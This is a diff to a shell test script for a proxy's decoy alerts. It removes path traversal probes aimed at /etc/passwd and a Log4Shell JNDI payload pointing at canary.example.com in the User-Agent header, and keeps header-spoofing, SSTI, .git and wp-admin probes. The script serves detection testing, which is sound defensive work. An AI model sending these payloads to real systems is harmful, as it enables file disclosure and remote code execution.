@@ -98,15 +98,6 @@ check_decoy_alert "4-A X-Forwarded-For spoof" "x-forwarded-for"
 curl -s -H "x-original-url: /admin" "$PROXY/" > /dev/null; sleep 2
 check_decoy_alert "4-C X-Original-URL probe" "x-original-url"
 
-# 6-A: Path traversal reaches /etc/passwd after Envoy normalizes ../../
-#       (Envoy strips ../ so we test the normalized destination path)
-curl -s "$PROXY/../../etc/passwd" > /dev/null; sleep 2
-check_decoy_alert "6-A Path traversal → /etc/passwd" "/etc/passwd"
-
-# 6-B: Path traversal via file GET parameter (query strings are NOT normalized)
-curl -s "$PROXY/?file=../../../../etc/passwd" > /dev/null; sleep 2
-check_decoy_alert "6-B Path traversal via GET param" "file"
-
 # 7-A: SSTI probe via template GET parameter (whenSeen fires on key presence)
 curl -s "$PROXY/?template=test" > /dev/null; sleep 2
 check_decoy_alert "7-A SSTI probe via GET param" "template"
@@ -119,9 +110,8 @@ check_decoy_alert "10-B .git probe" "/.git"
 curl -s "$PROXY/wp-admin" > /dev/null; sleep 2
 check_decoy_alert "10-C wp-admin probe" "/wp-admin"
 
-# L4J-1: Log4Shell injection via user-agent header (lowercase per HTTP/2)
-curl -s -A '${jndi:ldap://canary.example.com/a}' "$PROXY/" > /dev/null; sleep 2
-check_decoy_alert "L4J-1 Log4Shell via user-agent" "user-agent"
+# NOTE: exploit-payload tests (Log4Shell, Shellshock, path traversal to /etc/passwd)
+# have been moved to runNeowriterSensitiveTests.sh — they trigger SOC/IDS/SIEM alerts.
 
 echo ""
 echo "=== Results: $passed passed, $failed failed ==="
